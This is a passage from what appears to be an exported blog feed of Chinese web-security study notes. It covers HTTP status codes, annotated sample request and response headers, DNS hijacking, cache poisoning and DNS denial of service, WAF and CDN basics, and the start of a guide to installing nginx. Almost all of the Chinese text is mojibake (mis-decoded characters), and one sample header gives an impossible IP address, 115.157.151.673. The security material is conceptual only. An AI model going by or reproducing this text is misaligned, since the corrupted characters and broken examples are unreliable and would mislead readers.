align="left">Conflict</td><td align="left">æœåŠ¡å™¨å®Œæˆå®¢æˆ·ç«¯çš„ PUT è¯·æ±‚æ—¶å¯èƒ½è¿”å›æ­¤ä»£ç ï¼ŒæœåŠ¡å™¨å¤„ç†è¯·æ±‚æ—¶å‘ç”Ÿäº†å†²çª</td></tr><tr><td align="left">410</td><td align="left">Gone</td><td align="left">å®¢æˆ·ç«¯è¯·æ±‚çš„èµ„æºå·²ç»ä¸å­˜åœ¨ã€‚410ä¸åŒäº404ï¼Œå¦‚æœèµ„æºä»¥å‰æœ‰ç°åœ¨è¢«æ°¸ä¹…åˆ é™¤äº†å¯ä½¿ç”¨410ä»£ç ï¼Œç½‘ç«™è®¾è®¡äººå‘˜å¯é€šè¿‡301ä»£ç æŒ‡å®šèµ„æºçš„æ–°ä½ç½®</td></tr><tr><td align="left">411</td><td align="left">Length Required</td><td align="left">æœåŠ¡å™¨æ— æ³•å¤„ç†å®¢æˆ·ç«¯å‘é€çš„ä¸å¸¦Content-Lengthçš„è¯·æ±‚ä¿¡æ¯</td></tr><tr><td align="left">412</td><td align="left">Precondition Failed</td><td align="left">å®¢æˆ·ç«¯è¯·æ±‚ä¿¡æ¯çš„å…ˆå†³æ¡ä»¶é”™è¯¯</td></tr><tr><td align="left">413</td><td align="left">Request Entity Too Large</td><td align="left">ç”±äºè¯·æ±‚çš„å®ä½“è¿‡å¤§ï¼ŒæœåŠ¡å™¨æ— æ³•å¤„ç†ï¼Œå› æ­¤æ‹’ç»è¯·æ±‚ã€‚ä¸ºé˜²æ­¢å®¢æˆ·ç«¯çš„è¿ç»­è¯·æ±‚ï¼ŒæœåŠ¡å™¨å¯èƒ½ä¼šå…³é—­è¿æ¥ã€‚å¦‚æœåªæ˜¯æœåŠ¡å™¨æš‚æ—¶æ— æ³•å¤„ç†ï¼Œåˆ™ä¼šåŒ…å«ä¸€ä¸ªRetry-Afterçš„å“åº”ä¿¡æ¯</td></tr><tr><td align="left">414</td><td align="left">Request-URI Too Large</td><td align="left">è¯·æ±‚çš„URIè¿‡é•¿ï¼ˆURIé€šå¸¸ä¸ºç½‘å€ï¼‰ï¼ŒæœåŠ¡å™¨æ— æ³•å¤„ç†</td></tr><tr><td align="left">415</td><td align="left">Unsupported Media Type</td><td align="left">æœåŠ¡å™¨æ— æ³•å¤„ç†è¯·æ±‚é™„å¸¦çš„åª’ä½“æ ¼å¼</td></tr><tr><td align="left">416</td><td align="left">Requested range not satisfiable</td><td align="left">å®¢æˆ·ç«¯è¯·æ±‚çš„èŒƒå›´æ— æ•ˆ</td></tr><tr><td align="left">417</td><td align="left">Expectation Failed</td><td align="left">æœåŠ¡å™¨æ— æ³•æ»¡è¶³Expectçš„è¯·æ±‚å¤´ä¿¡æ¯</td></tr><tr><td align="left">500</td><td align="left">Internal Server Error</td><td align="left">æœåŠ¡å™¨å†…éƒ¨é”™è¯¯ï¼Œæ— æ³•å®Œæˆè¯·æ±‚</td></tr><tr><td align="left">501</td><td align="left">Not Implemented</td><td align="left">æœåŠ¡å™¨ä¸æ”¯æŒè¯·æ±‚çš„åŠŸèƒ½ï¼Œæ— æ³•å®Œæˆè¯·æ±‚</td></tr><tr><td align="left">502</td><td align="left">Bad Gateway</td><td align="left">ä½œä¸ºç½‘å…³æˆ–è€…ä»£ç†å·¥ä½œçš„æœåŠ¡å™¨å°è¯•æ‰§è¡Œè¯·æ±‚æ—¶ï¼Œä»è¿œç¨‹æœåŠ¡å™¨æ¥æ”¶åˆ°äº†ä¸€ä¸ªæ— æ•ˆçš„å“åº”</td></tr><tr><td align="left">503</td><td align="left">Service Unavailable</td><td align="left">ç”±äºè¶…è½½æˆ–ç³»ç»Ÿç»´æŠ¤ï¼ŒæœåŠ¡å™¨æš‚æ—¶çš„æ— æ³•å¤„ç†å®¢æˆ·ç«¯çš„è¯·æ±‚ã€‚å»¶æ—¶çš„é•¿åº¦å¯åŒ…å«åœ¨æœåŠ¡å™¨çš„Retry-Afterå¤´ä¿¡æ¯ä¸­</td></tr><tr><td align="left">504</td><td align="left">Gateway Time-out</td><td align="left">å……å½“ç½‘å…³æˆ–ä»£ç†çš„æœåŠ¡å™¨ï¼ŒæœªåŠæ—¶ä»è¿œç«¯æœåŠ¡å™¨è·å–è¯·æ±‚</td></tr><tr><td align="left">505</td><td align="left">HTTP Version not supported</td><td align="left">æœåŠ¡å™¨ä¸æ”¯æŒè¯·æ±‚çš„HTTPåè®®çš„ç‰ˆæœ¬ï¼Œæ— æ³•å®Œæˆå¤„ç†</td></tr></tbody></table><h2 id="å®ä¾‹è¯´æ˜"><a href="#å®ä¾‹è¯´æ˜" class="headerlink" title="å®ä¾‹è¯´æ˜"></a>å®ä¾‹è¯´æ˜</h2><p>æ— è®ºæ˜¯è¯·æ±‚æŠ¥æ–‡è¿˜æ˜¯å“åº”æŠ¥æ–‡ï¼Œè™½ç„¶åˆ†åˆ«ç”±ä»¥ä¸Šäº”ä¸ªéƒ¨åˆ†ç»„æˆï¼Œä½†æ˜¯åœ¨ä¸€å®šæƒ…å†µä¸‹æœ‰äº›å¹¶ä¸æ˜¯å¿…é¡»è¦çš„ï¼Œä½†æ˜¯å¯¹äºï¼šGeneral-header(é€šç”¨å¤´éƒ¨)ã€è¯·æ±‚å¤´ï¼ˆå®¢æˆ·ç«¯-&gt;æœåŠ¡å™¨[Request Header])ã€å“åº”å¤´(æœåŠ¡ç«¯-&gt;å®¢æˆ·ç«¯[Response Header]) è¿™ä¸‰éƒ¨åˆ†æ˜¯å¿…é¡»è¦æœ‰çš„ã€‚äºæ˜¯æ‹¿ä¸€ä¸ªå®ä¾‹æ¥å¯¹è¿™ä¸‰éƒ¨åˆ†çš„å†…å®¹è¿›è¡Œè¯´æ˜è®°å½•ï¼š</p><p>ï¼ˆ1ï¼‰<strong>General-header(é€šç”¨å¤´éƒ¨)</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Request URL: http:&#x2F;&#x2F;115.148.141.110:8980&#x2F;v1&#x2F;purchase&#x2F;list   ã€€ # è¯·æ±‚çš„URLåœ°å€ï¼ˆåŒ…å«è¯·æ±‚ç±»å‹ã€è¯·æ±‚åŸŸåã€è¯·æ±‚ç«¯å£ã€è¯·æ±‚åœ°å€ï¼‰</span><br><span class="line">Request Method: POST            ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ # è¯·æ±‚æ–¹å¼</span><br><span class="line">Status Code: 200 OK                                            # å“åº”çš„çŠ¶æ€ç ã€ç»“æœ </span><br><span class="line">Remote Address: 127.0.0.1:8899                                 # è¯·æ±‚çš„è¿œç¨‹åœ°å€       </span><br><span class="line">Referrer Policy: no-referrer-when-downgrade                    # referrerç­–ç•¥ï¼ˆäº”ç§æ–¹æ³•ï¼‰</span><br></pre></td></tr></table></figure><p>ï¼ˆ2ï¼‰<strong>è¯·æ±‚å¤´ï¼ˆå®¢æˆ·ç«¯-&gt;æœåŠ¡å™¨[Request Header])</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;v1&#x2F;purchase&#x2F;list HTTP&#x2F;1.1       # è¯·æ±‚æ–¹å¼ã€è¯·æ±‚åœ°å€ã€è¯·æ±‚æ‰€ä½¿ç”¨çš„åè®®å’Œç‰ˆæœ¬</span><br><span class="line">Host: 115.157.151.673:8180            # ç›®æ ‡ä¸»æœºåœ°å€å’Œç«¯å£å·</span><br><span class="line">Connection: keep-alive                # ç»´æŠ¤å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯çš„è¿æ¥å…³ç³» </span><br><span class="line">Content-Length: 68                    # æè¿°HTTPæ¶ˆæ¯å®ä½“çš„ä¼ è¾“é•¿åº¦</span><br><span class="line">Accept: application&#x2F;json, text&#x2F;javascript, *&#x2F;*; q&#x3D;0.01     #å‘é€ç«¯ï¼ˆå®¢æˆ·ç«¯ï¼‰å¸Œæœ›æ¥å—çš„æ•°æ®ç±»å‹ã€q æ˜¯æƒé‡ç³»æ•°ï¼ŒèŒƒå›´ 0 &#x3D;&lt; q &lt;&#x3D; 1ï¼Œq å€¼è¶Šå¤§ï¼Œè¯·æ±‚è¶Šå€¾å‘äºè·å¾—å…¶â€œ;â€ä¹‹å‰çš„ç±»å‹è¡¨ç¤ºçš„å†…å®¹</span><br><span class="line">Origin: http:&#x2F;&#x2F;apptest.zhidianlife.com:8007ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ # æµè§ˆå™¨åœ¨referrerå­—æ®µä¸­åªæ˜¾ç¤ºæºç½‘ç«™çš„æºåœ°å€ï¼ˆå³åè®®ã€åŸŸåã€ç«¯å£ï¼‰ï¼Œè€Œä¸åŒ…æ‹¬å®Œæ•´çš„è·¯å¾„  </span><br><span class="line">Authorization: c81e7286507f4aa4b6179f4c381b4c64ã€€ã€€ã€€ã€€ã€€ã€€ã€€# è¯·æ±‚æ‰€éœ€çš„è®¤è¯ä¿¡æ¯</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 6.3; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;75.0.3770.100 Safari&#x2F;537.36          # æºå¸¦å½“å‰çš„ç”¨æˆ·ä»£ç†ä¿¡æ¯ï¼Œä¸€èˆ¬åŒ…å«æµè§ˆå™¨ã€æµè§ˆå™¨å†…æ ¸å’Œæ“ä½œç³»ç»Ÿçš„ç‰ˆæœ¬å‹å·ä¿¡æ¯ã€‚</span><br><span class="line">Content-Type: application&#x2F;json   ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€# è¯·æ±‚å®ä½“ï¼Œæ–‡æ¡£ç±»å‹</span><br><span class="line">Referer: http:&#x2F;&#x2F;apptest.zhidianlife.com:8007&#x2F;procurement&#x2F;order?_t&#x3D;756512&amp;_winid&#x3D;w9290         #  å¸¸ç”¨äºåŒæºé™åˆ¶ç­–ç•¥ï¼Œè¡¨ç¤ºè¯·æ±‚å‘èµ·æ¥æºçš„URIï¼Œä¹Ÿå°±æ˜¯å½“å‰é¡µé¢èµ„æºçš„çˆ¶é¡µé¢ã€‚é€šè¿‡è¿½è¸ªRefererå¯å¾—å‡ºèµ„æºé¡µé¢ä¹‹é—´å¤æ‚çš„è·³è½¬é“¾ã€‚</span><br><span class="line">Accept-Encoding: gzip, deflate        # å®¢æˆ·ç«¯æ¥æ”¶ç¼–ç ç±»å‹ï¼Œä¸€äº›ç½‘ç»œå‹ç¼©æ ¼å¼ï¼š gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9       # å®¢æˆ·ç«¯æ¥æ”¶çš„è¯­è¨€ç±»å‹ ã€ä¸­æ–‡</span><br></pre></td></tr></table></figure><p>ï¼ˆ3ï¼‰<strong>å“åº”å¤´(æœåŠ¡ç«¯-&gt;å®¢æˆ·ç«¯[Response Header])</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">HTTP&#x2F;1.1 200 OK             # è¯·æ±‚åè®®ä»¥åŠæœ¬ç‰ˆã€è¯·æ±‚çŠ¶æ€ç </span><br><span class="line">Date: Tue, 02 Jul 2019 14:07:31 GMT # æœåŠ¡ç«¯å“åº”å®¢æˆ·ç«¯çš„å†…å®¹è¿‡æœŸæ—¶é—´</span><br><span class="line">Content-Type: application&#x2F;json; charset&#x3D;utf-8     # æœåŠ¡ç«¯å‘é€çš„ç±»å‹åŠé‡‡ç”¨çš„ç¼–ç æ–¹å¼</span><br><span class="line">Server: Kestrel         ã€€ã€€ã€€ã€€ã€€ã€€ã€€# WEB æœåŠ¡å™¨ æœåŠ¡ç«¯çš„WebæœåŠ¡ç«¯å</span><br><span class="line">Vary: Origin  # WEBæœåŠ¡å™¨ç”¨è¯¥å¤´éƒ¨çš„å†…å®¹å‘Šè¯‰ Cache æœåŠ¡å™¨ï¼Œåœ¨ä»€ä¹ˆæ¡ä»¶ä¸‹æ‰èƒ½ç”¨æœ¬å“åº”æ‰€è¿”å›çš„å¯¹è±¡å“åº”åç»­çš„è¯·æ±‚</span><br><span class="line">Access-Control-Allow-Credentials: trueã€€ã€€# å…è®¸è¿è¡Œå®¢æˆ·ç«¯æºå¸¦è¯ä¹¦å¼è®¿é—®   </span><br><span class="line">Access-Control-Allow-Origin: http:&#x2F;&#x2F;apptest.zhidianlife.com:8007</span><br><span class="line">Content-Length: 33310ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ # å…è®¸æŒ‡å®šçš„åŸŸåã€åœ°å€è®¿é—®</span><br></pre></td></tr></table></figure><h1 id="æ½œåœ¨çš„å®‰å…¨é—®é¢˜"><a href="#æ½œåœ¨çš„å®‰å…¨é—®é¢˜" class="headerlink" title="æ½œåœ¨çš„å®‰å…¨é—®é¢˜"></a>æ½œåœ¨çš„å®‰å…¨é—®é¢˜</h1><p><strong>DNS è§£æçš„å®‰å…¨é—®é¢˜ï¼š</strong></p><ul><li><p><strong>DNSåŸŸååŠ«æŒ</strong>ï¼Œæ”»å‡»è€…é€šè¿‡å¯¹åŸŸåè§£ææœåŠ¡å™¨çš„æ”»å‡»æˆ–ä¼ªé€ ï¼ŒæŠŠç›®æ ‡ç½‘ç«™çš„åŸŸåè§£æåˆ°é”™è¯¯ï¼ˆé»‘å®¢å‡†å¤‡ï¼‰çš„é¡µé¢ï¼Œä»è€Œè¾¾åˆ°æ”»å‡»è€…çš„æŸç§ç›®çš„ã€‚</p><p>é˜²èŒƒæªæ–½ï¼šè¿›è¡ŒIPåœ°å€å’ŒMACåœ°å€çš„ç»‘å®šï¼›ä½¿ç”¨åŸŸåç³»ç»Ÿçš„å®‰å…¨åè®®ï¼›å¯¹DNSæ•°æ®åŒ…è¿›è¡Œç›‘æµ‹ï¼›ä½¿ç”¨IPè¿›è¡Œè®¿é—®ç­‰ã€‚</p></li><li><p><strong>DNS ç¼“å­˜æŠ•æ¯’</strong>ï¼Œé€šè¿‡åˆ©ç”¨ç½‘æ°‘ISPç«¯çš„DNSç¼“å­˜æœåŠ¡å™¨çš„æ¼æ´è¿›è¡Œæ”»å‡»æˆ–æ§åˆ¶ï¼Œä»è€Œæ”¹å˜è¯¥ISPå†…çš„ç”¨æˆ·è®¿é—®åŸŸåçš„å“åº”ç»“æœ;æˆ–è€…é€šè¿‡åˆ©ç”¨ç”¨æˆ·æƒå¨åŸŸåæœåŠ¡å™¨ä¸Šçš„æ¼æ´ï¼Œå¦‚å½“ç”¨æˆ·æƒå¨åŸŸåæœåŠ¡å™¨åŒæ—¶å¯ä»¥è¢«å½“ä½œç¼“å­˜æœåŠ¡å™¨ä½¿ç”¨ï¼Œé»‘å®¢å¯ä»¥å®ç°ç¼“å­˜æŠ•æ¯’ï¼Œå°†é”™è¯¯çš„åŸŸåçºªå½•å­˜å…¥ç¼“å­˜ä¸­ï¼Œä»è€Œä½¿æ‰€æœ‰ä½¿ç”¨è¯¥ç¼“å­˜æœåŠ¡å™¨çš„ç”¨æˆ·å¾—åˆ°é”™è¯¯çš„DNSè§£æç»“æœã€‚</p></li><li><p><strong>DNSæ‹’ç»æœåŠ¡æ”»å‡»</strong>ï¼Œåˆ©ç”¨DNSè½¯ä»¶ç‰ˆæœ¬æ¼æ´æ”»å‡»ï¼›åˆ©ç”¨åƒµå°¸ç½‘ç»œä¸­å¤§é‡çš„è¢«æ§ä¸»æœºï¼Œä¼ªè£…æˆè¢«æ”»å‡»ä¸»æœºï¼Œåœ¨ç‰¹å®šæ—¶é—´ç‚¹ä¸Šï¼Œè¿ç»­å‘å¤šä¸ªå…è®¸é€’å½’æŸ¥è¯¢çš„DNSæœåŠ¡å™¨å‘é€å¤§é‡çš„DNSæŸ¥è¯¢è¯·æ±‚ï¼Œè¿«ä½¿å…¶æä¾›åº”ç­”æœåŠ¡ï¼Œç»DNSæœåŠ¡å™¨æ”¾å¤§åçš„å¤§é‡åº”ç­”æ•°æ®å‘é€åˆ°è¢«æ”»å‡»ä¸»æœºï¼Œå½¢æˆæ”»å‡»æµé‡ï¼Œå¯¼è‡´å…¶æ— æ³•æä¾›æ­£å¸¸æœåŠ¡ç”šè‡³ç˜«ç—ªã€‚</p><blockquote><p>ç›¸å…³æ–‡ç« åˆ†äº«ï¼š<a href="https://mp.weixin.qq.com/s/ByOpNmN6JIMRdTT8E9DkoQ">çœŸçš„é»‘å®¢èƒ½è®©ä½ åˆ†åˆ†é’Ÿå¼€è¿›æ²Ÿé‡Œï¼Œä½†ä»–ä»¬ä¸å±‘äºæ­¤</a></p></blockquote></li></ul><p><strong>HTTPçš„å®‰å…¨é—®é¢˜ï¼š</strong></p><ul><li>Httpçš„é€šä¿¡æ˜¯æ˜æ–‡çš„ï¼Œå­˜åœ¨è¢«çªƒå¬çš„é£é™©</li><li>æ— æ³•ç¡®è®¤é€šä¿¡åŒæ–¹èº«ä»½ï¼Œæœ‰å¯èƒ½ä¼šè¢«äººä¼ªé€ </li><li>æ— æ³•éªŒè¯æŠ¥æ–‡çš„å®Œæ•´æ€§ï¼Œæ— æ³•éªŒè¯æ˜¯å¦è¢«ç¯¡æ”¹è¿‡</li></ul><h1 id="WAFå’ŒCDN"><a href="#WAFå’ŒCDN" class="headerlink" title="WAFå’ŒCDN"></a>WAFå’ŒCDN</h1><ul><li><strong>WAF</strong></li></ul><p>WAF(Web Application Firewall)ç§°ä¸ºwebåº”ç”¨é˜²ç«å¢™ï¼Œæ˜¯é€šè¿‡æ‰§è¡Œä¸€ç³»åˆ—é’ˆå¯¹HTTP,HTTPSçš„å®‰å…¨ç­–ç•¥ï¼Œæ¥ä¸“é—¨å¯¹webåº”ç”¨æä¾›ä¿æŠ¤çš„ä¸€æ¬¾äº§å“ï¼Œå¯¹æ¥è‡ªWebåº”ç”¨ç¨‹åºå®¢æˆ·ç«¯çš„å„ç±»è¯·æ±‚è¿›è¡Œå†…å®¹æ£€æµ‹å’ŒéªŒè¯ï¼Œç¡®ä¿å…¶å®‰å…¨æ€§ä¸åˆæ³•æ€§ï¼Œå¯¹éæ³•çš„è¯·æ±‚äºˆä»¥å®æ—¶é˜»æ–­ï¼Œä¸ºWebåº”ç”¨æä¾›é˜²æŠ¤ã€‚é€šä¿—çš„è¯´ï¼ŒWAFç±»ä¼¼äºåœ°é“ç«™çš„å®‰æ£€ï¼Œå¯¹äºHTTPè¯·æ±‚è¿›è¡Œå¿«é€Ÿå®‰å…¨æ£€æŸ¥ï¼Œé€šè¿‡è§£æHTTPæ•°æ®ï¼Œåœ¨ä¸åŒçš„å­—æ®µåˆ†åˆ«åœ¨ç‰¹å¾ã€è§„åˆ™ç­‰ç»´åº¦è¿›è¡Œåˆ¤æ–­ï¼Œåˆ¤æ–­çš„ç»“æœä½œä¸ºæ˜¯å¦æ‹¦æˆªçš„ä¾æ®ä»è€Œå†³å®šæ˜¯å¦æ”¾è¡Œã€‚</p><p> WAF å¯ä»¥ç”¨æ¥å±è”½å¸¸è§çš„ç½‘ç«™æ¼æ´æ”»å‡»ï¼Œå¦‚SQLæ³¨å…¥ï¼ŒXMLæ³¨å…¥ã€XSSç­‰ã€‚ä¸€èˆ¬é’ˆå¯¹çš„æ˜¯åº”ç”¨å±‚è€Œéç½‘ç»œå±‚çš„å…¥ä¾µï¼Œä»æŠ€æœ¯è§’åº¦åº”è¯¥ç§°ä¹‹ä¸ºWeb IPSã€‚å…¶é˜²æŠ¤é‡ç‚¹æ˜¯SQLæ³¨å…¥ã€‚</p><p>  Webé˜²ç«å¢™äº§å“éƒ¨ç½²åœ¨WebæœåŠ¡å™¨çš„å‰é¢ï¼Œä¸²è¡Œæ¥å…¥ï¼Œä¸ä»…åœ¨ç¡¬ä»¶æ€§èƒ½ä¸Šè¦æ±‚é«˜ï¼Œè€Œä¸”ä¸èƒ½å½±å“WebæœåŠ¡ï¼Œæ‰€ä»¥HAåŠŸèƒ½ã€BypassåŠŸèƒ½éƒ½æ˜¯å¿…é¡»çš„ï¼Œè€Œä¸”è¿˜è¦ä¸è´Ÿè½½å‡è¡¡ã€Web Cacheç­‰WebæœåŠ¡å™¨å‰çš„å¸¸è§çš„äº§å“åè°ƒéƒ¨ç½²ã€‚</p><ul><li><strong>CDN</strong></li></ul><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201222175832644.png" alt="image-20201222175832644"></p><p>è¿™ä¸ªurlä¸­æœ‰cdnå­—æ ·ã€‚ä»€ä¹ˆæ˜¯CDN? å¦‚æœæˆ‘åœ¨å¹¿å·è®¿é—®æ·˜å®ï¼Œè·¨çœçš„é€šä¿¡å¿…ç„¶é€ æˆå»¶è¿Ÿï¼Œå¦‚æœæ·˜å®åœ¨å¹¿ä¸œå»ºç«‹ä¸€ä¸ªæœåŠ¡å™¨ï¼Œé™æ€èµ„æºæˆ‘å¯ä»¥ç›´æ¥ä»å°±è¿‘çš„å¹¿ä¸œæœåŠ¡å™¨è·å–ï¼Œå¿…ç„¶èƒ½æé«˜æ•´ä¸ªç½‘ç«™çš„æ‰“å¼€é€Ÿåº¦ï¼Œè¿™å°±å«åšCDNã€‚CDNå«åšå†…å®¹åˆ†å‘ç½‘ç»œï¼Œæ˜¯ä¾é éƒ¨ç½²åœ¨å„åœ°çš„è¾¹ç¼˜æœåŠ¡å™¨ï¼Œä½¿ç”¨æˆ·å°±è¿‘è·å–æ‰€éœ€å†…å®¹ï¼Œé™ä½ç½‘ç»œæ‹¥å¡ï¼Œæé«˜è®¿é—®é€Ÿåº¦ã€‚</p><h1 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h1><p><a href="https://baike.baidu.com/tashuo/browse/content?id=46cc373d43f2830a7bae71ce&lemmaId=86062&fromLemmaModule=pcRight">ä»€ä¹ˆæ˜¯åŸŸåï¼Ÿæˆ‘ä»¬ä¸ºä»€ä¹ˆè¦ä¿æŠ¤å®ƒï¼Ÿ</a></p><p><a href="https://blog.csdn.net/li_adou/article/details/78252202">åŸŸåè§£æçš„è®°å½•ç±»å‹</a></p><p><a href="https://www.cnblogs.com/chalan630/p/12866009.html">web å®‰å…¨ä¹‹é¡µé¢è§£æçš„æµç¨‹å­¦ä¹ </a></p><p><a href="https://blog.csdn.net/u010516151/article/details/102855151">web é¡µé¢è§£æçš„æµç¨‹æ€»ç»“</a></p><p><a href="https://blog.csdn.net/qq_35732147/article/details/80661994">ç»Ÿä¸€èµ„æºå®šä½ç¬¦ï¼ˆURLï¼‰è¯¦è§£</a></p><p><a href="https://www.cnblogs.com/wangyuyang1016/p/11681957.html#_caption2">Webé¡µé¢è§£æè¿‡ç¨‹ï¼ˆæµ…ï¼‰</a></p><p><a href="https://blog.csdn.net/JackLiu16/article/details/79426241">DNSæ¬ºéª—æ”»å‡»åŠå¦‚ä½•é˜²æŠ¤</a></p><p><a href="https://blog.csdn.net/gufenchen/article/details/93485351">WAFä»‹ç»</a></p><p><a href="https://blog.csdn.net/dushan1234/article/details/98073575">æ‰“å¼€ä¸€ä¸ªç½‘é¡µçš„å…¨è¿‡ç¨‹</a></p>]]></content>
      
      
      <categories>
          
          <category> Webå®‰å…¨å­¦ä¹  </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Webå®‰å…¨å­¦ä¹  </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Webç¯å¢ƒæ­å»ºè®°å½•</title>
      <link href="posts/60533.html"/>
      <url>posts/60533.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>æœ¬æ–‡éƒ¨åˆ†å†…å®¹æ¥æºäº<a href="https://bingslient.github.io/2019/10/31/%E6%9C%AC%E5%9C%B0%20web%20%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA%E4%B9%8BLEMP/">åœ¨ Ubuntu18.04 å®‰è£… LEMPï¼Œæ„å»ºæœ¬åœ°ç½‘ç«™</a>ï¼Œä½œè€… <a href="https://bingslient.github.io/">BingSlient</a>ï¼Œç‰¹æ­¤æ„Ÿè°¢ï¼</p></blockquote><blockquote><p>æ­å»ºç¯å¢ƒ : LAMP (Linux + Nginx/Apache + MySQL + PHP)</p><p>å³æŠŠ Nginx/Apacheã€MySQLä»¥åŠPHPå®‰è£…åœ¨Linuxç³»ç»Ÿä¸Šï¼Œç»„æˆä¸€ä¸ªç¯å¢ƒæ¥è¿è¡ŒPHPçš„è„šæœ¬è¯­è¨€ï¼Œé€šå¸¸æ˜¯ç½‘ç«™ã€‚æœ¬æ–‡å¤§éƒ¨åˆ†å†…å®¹æ¥æºäº</p></blockquote><h1 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h1><ul><li><p>Linuxï¼šæ“ä½œç³»ç»Ÿä¹‹ä¸€ï¼Œè¿™ä¸ªä¸ç”¨å¤šè¯´äº†ã€‚</p></li><li><p><a href="https://www.apache.org/">Apache</a>ï¼šåº”ç”¨æœ€å¹¿æ³›çš„WebæœåŠ¡å™¨ä¹‹ä¸€ï¼Œå…¶ä¸»è¦åŠŸèƒ½æ˜¯æä¾›ç½‘ä¸Šä¿¡æ¯æµè§ˆæœåŠ¡ã€‚WebæœåŠ¡å™¨å¯ä»¥è§£æHTTPåè®®ã€‚å½“WebæœåŠ¡å™¨æ¥æ”¶åˆ°ä¸€ä¸ªHTTPè¯·æ±‚,ä¼šè¿”å›ä¸€ä¸ªHTTPå“åº”ï¼Œä¾‹å¦‚é€å›ä¸€ä¸ªHTMLé¡µé¢ã€‚ä¸ºäº†å¤„ç†ä¸€ä¸ªè¯·æ±‚WebæœåŠ¡å™¨å¯ä»¥å“åº”ä¸€ä¸ªé™æ€é¡µé¢æˆ–å›¾ç‰‡ï¼Œè¿›è¡Œé¡µé¢è·³è½¬æˆ–è€…æŠŠåŠ¨æ€å“åº”çš„äº§ç”Ÿå§”æ‰˜ç»™ä¸€äº›å…¶å®ƒçš„ç¨‹åºä¾‹å¦‚CGIè„šæœ¬ï¼ŒJSPè„šæœ¬ï¼Œservletsï¼ŒASPè„šæœ¬ï¼ŒæœåŠ¡å™¨ç«¯JavaScriptï¼Œæˆ–è€…ä¸€äº›å…¶å®ƒçš„æœåŠ¡å™¨ç«¯æŠ€æœ¯ã€‚å…¶ä»–å¸¸ç”¨webæœåŠ¡å™¨è¿˜æœ‰ Nginx, IIS, Tomcatç­‰ã€‚</p></li><li><p><a href="https://www.mysql.com/">MySQL</a>ï¼šæ˜¯ä¸€ä¸ªå…³ç³»å‹æ•°æ®åº“ï¼Œç”±ç‘å…¸MySQL AB å…¬å¸å¼€å‘ï¼Œç›®å‰å±äº Oracle æ——ä¸‹äº§å“ï¼Œå…³ç³»æ•°æ®åº“å°†æ•°æ®ä¿å­˜åœ¨ä¸åŒçš„è¡¨ä¸­ï¼Œè€Œä¸æ˜¯å°†æ‰€æœ‰æ•°æ®æ”¾åœ¨ä¸€ä¸ªå¤§ä»“åº“å†…ï¼Œè¿™æ ·å°±å¢åŠ äº†é€Ÿåº¦å¹¶æé«˜äº†çµæ´»æ€§ã€‚</p></li><li><p><a href="https://www.php.net/">PHP</a> ï¼šä¸€ç§æœåŠ¡å™¨ç«¯è„šæœ¬è¯­è¨€ï¼Œè¿™é‡Œä½œä¸ºApacheçš„ä¸€ä¸ªæ¨¡å—ã€‚</p></li></ul><h1 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h1><h2 id="å®‰è£…Nginx"><a href="#å®‰è£…Nginx" class="headerlink" title="å®‰è£…Nginx"></a>å®‰è£…Nginx</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#æ›´æ–°å¯è·å–è½¯ä»¶åŠå…¶ç‰ˆæœ¬ä¿¡æ¯</span></span><br><span class="line">apt-get upgrade</span><br><span class="line">apt-get update</span><br><span class="line">apt-get install nginx</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹nginxç‰ˆæœ¬</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nginx -v</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹Nginxè¿è¡ŒçŠ¶æ€</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service nginx status</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/jWGrVhoucm6iOMb.png" alt="image-20201031195542396"></p><h2 id="è®¿é—®nginxé¡µé¢"><a href="#è®¿é—®nginxé¡µé¢" class="headerlink" title="è®¿é—®nginxé¡µé¢"></a>è®¿é—®nginxé¡µé¢</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span 